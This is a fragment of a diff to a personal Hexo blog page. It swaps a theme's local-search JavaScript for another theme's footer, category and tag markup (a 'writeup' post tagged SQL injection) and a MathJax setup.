src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="255,165,0" opacity="0.6" count="99" zIndex="-1"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script>function initSearch() {
-  var isXML = true;
-  var search_path = 'search.json';
+    
+      
 
-  if (!search_path) {
-    search_path = 'search.xml';
-  } else if (/json$/i.test(search_path)) {
-    isXML = false;
-  }
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/writeup/">writeup</a>
+    </span>
+    
 
-  var path = '/' + search_path;
-  $.ajax({
-    url: path,
-    dataType: isXML ? 'xml' : 'json',
-    async: true,
-    success: function (res) {
-      var datas = isXML ? $('entry', res).map(function () {
-        // 将 XML 转为 JSON
-        return {
-          title: $('title', this).text(),
-          content: $('content', this).text(),
-          url: $('url', this).text()
-        };
-      }).get() : res;
-      var $input = $('.search-input input');
-      var $result = $('.search-results');
-      // 搜索对象（标题、内容）的权重，影响显示顺序
-      var WEIGHT = { title: 100, content: 1 };
-      var searchPost = function () {
-        var searchText = $input.val().toLowerCase().trim();
-        // 根据空白字符分隔关键字
-        var keywords = searchText.split(/[\s]+/);
-        // 搜索结果
-        var matchPosts = [];
+    
+    
 
-        // 有多个关键字时，将原文字整个保存下来
-        if (keywords.length > 1) {
-          keywords.push(searchText);
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/SQL注入/">SQL注入</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2021 Aesm1p
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
         }
-        // 防止未输入字符时搜索
-        if (searchText.length > 0) {
-          datas.forEach(function (data) {
-            var isMatch  = false;
-            // 没有标题的文章使用预设的 i18n 变量代替
-            var title = (data.title && data.title.trim()) || '[ Untitled ]';
-            var titleLower = title && title.toLowerCase();
-            // 删除 HTML 标签 和 所有空白字符
-            var content = data.content && data.content.replace(/<[^>]+>/g, '');
-            var contentLower = content && content.toLowerCase();
-            // 删除重复的 /
-            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
-            // 标题中匹配到的关键词
-            var titleHitSlice = [];
-            // 内容中匹配到的关键词
-            var contentHitSlice = [];
-
-            keywords.forEach(function (keyword) {
-              /**
-              * 获取匹配的关键词的索引
-              * @param {String} keyword 要匹配的关键字
-              * @param {String} text 原文字
-              * @param {Boolean} caseSensitive 是否区分大小写
-              * @param {Number} weight 匹配对象的权重。权重大的优先显示
-              * @return {Array}
-              */
-              function getIndexByword (word, text, caseSensitive, weight) {
-                if (!word || !text) {
-                  return [];
-                };
-
-                var startIndex = 0; // 每次匹配的开始索引
-                var index = -1;     // 匹配到的索引值
-                var result = [];    // 匹配结果
-
-                if (!caseSensitive) {
-                  word = word.toLowerCase();
-                  text = text.toLowerCase();
-                }
-
-                while((index = text.indexOf(word, startIndex)) !== -1) {
-                  var hasMatch = false;
-                  // 索引位置相同的关键词，保留长度较长的
-                  titleHitSlice.forEach(function (hit) {
-                    if (hit.index === index && hit.word.length < word.length) {
-                      hit.word = word;
-                      hasMatch = true;
-                    }
-                  });
-                  startIndex = index + word.length;
-                  !hasMatch && result.push({ index: index, word: word, weight: weight });
-                }
-                return result;
-              }
-              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
-              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
-            });
-
-            var hitTitle = titleHitSlice.length;
-            var hitContent = contentHitSlice.length;
-
-            if (hitTitle > 0 || hitContent > 0) {
-              isMatch = true;
-            }
-            if (isMatch) {
-              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
-                // 按照匹配文字的索引的递增顺序排序
-                hit.sort(function (left, right) {
-                  return left.index - right.index;
-                });
-              });
-              /**
-              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
-              * @param {String} text 原文本
-              * @param {Array} hitSlice 匹配项的索引信息
-              * @param {Number} start 开始索引
-              * @param {Number} end 结束索引
-              * @return {String}
-              */
-              function highlightKeyword (text, hitSlice, start, end) {
-                if (!text || !hitSlice || !hitSlice.length) {
-                  return;
-                }
-
-                var result = '';
-                var startIndex = start;
-                var endIndex = end;
-                hitSlice.forEach(function (hit) {
-                  if (hit.index < startIndex) {
-                    return;
-                  }
-
-                  var hitWordEnd = hit.index + hit.word.length;
-                  result += text.slice(startIndex, hit.index);
-                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
-                  startIndex = hitWordEnd;
-                });
-                result += text.slice(startIndex, endIndex);
-                return result;
-              }
-
-              var postData = {};
-              // 文章总的搜索权重
-              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
-              // 标记匹配关键词后的标题
-              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
-              // 标记匹配关键词后的内容
-              var postContent;
-              // 显示内容的长度
-              var SHOW_WORD_LENGTH = 200;
-              // 命中关键词前的字符显示长度
-              var SHOW_WORD_FRONT_LENGTH = 20;
-              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
-
-              // 截取匹配的第一个字符，前后共 200 个字符来显示
-              if (contentHitSlice.length > 0) {
-                var firstIndex = contentHitSlice[0].index;
-                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
-                var end = firstIndex + SHOW_WORD_END_LENGTH;
-                postContent = highlightKeyword(content, contentHitSlice, start, end);
-              } else { // 未匹配到内容，直接截取前 200 个字符来显示
-                postContent = content.slice(0, SHOW_WORD_LENGTH);
-              }
-              postData.title = postTitle;
-              postData.content = postContent;
-              postData.url = postURL;
-              postData.weight = postWeight;
-              matchPosts.push(postData);
-            }
-          });
-        }
-
-        var resultInnerHtml = '';
-        if (matchPosts.length) {
-          // 按权重递增的顺序排序，使权重大的优先显示
-          matchPosts.sort(function (left, right) {
-            return right.weight - left.weight;
-          });
-          resultInnerHtml += '<ul>';
-          matchPosts.forEach(function (post) {
-            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
-            resultInnerHtml += post.title;
-            resultInnerHtml += '</a><div class="search-results-content">';
-            resultInnerHtml += post.content;
-            resultInnerHtml += '</div></li>';
-          });
-          resultInnerHtml += '</ul>';
-        } else {
-          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
-        }
-        $result.html(resultInnerHtml);
-      };
-      $input.on('input', searchPost);
-      $input.on('keyup', function (e) {
-        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
-          searchPost();
-        }
-      });
-    }
-  });
-}
-
-function closeSearch () {
-  $('body').css({ overflow: 'auto' });
-  $('.search-popup').css({ display: 'none' });
-  $('.search-mask').css({ display: 'none' });
-}
-
-window.addEventListener('DOMContentLoaded', function () {
-  Stun.utils.pjaxReloadLocalSearch = function () {
-    $('.header-nav-search').on('click', function (e) {
-      e.stopPropagation();
-      $('body').css('overflow', 'hidden');
-      $('.search-popup')
-        .velocity('stop')
-        .velocity('transition.expandIn', {
-          duration: 300,
-          complete: function () {
-            $('.search-popup input').focus();
-          }
-        });
-      $('.search-mask')
-        .velocity('stop')
-        .velocity('transition.fadeIn', {
-          duration: 300
-        });
-
-      initSearch();
     });
-    $('.search-mask, .search-close').on('click', function () {
-      closeSearch();
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
     });
-    $(document).on('keydown', function (e) {
-      // Escape <=> 27
-      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
-        closeSearch();
-      }
-    });
-  };
-
-  Stun.utils.pjaxReloadLocalSearch();
-}, false);</script><script src="/js/utils.js?v=2.1.1"></script><script src="/js/stun-boot.js?v=2.1.1"></script><script src="/js/scroll.js?v=2.1.1"></script><script src="/js/header.js?v=2.1.1"></script><script type="application/json" src="/search.json"></script></body></html>
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+</body>
+</html>
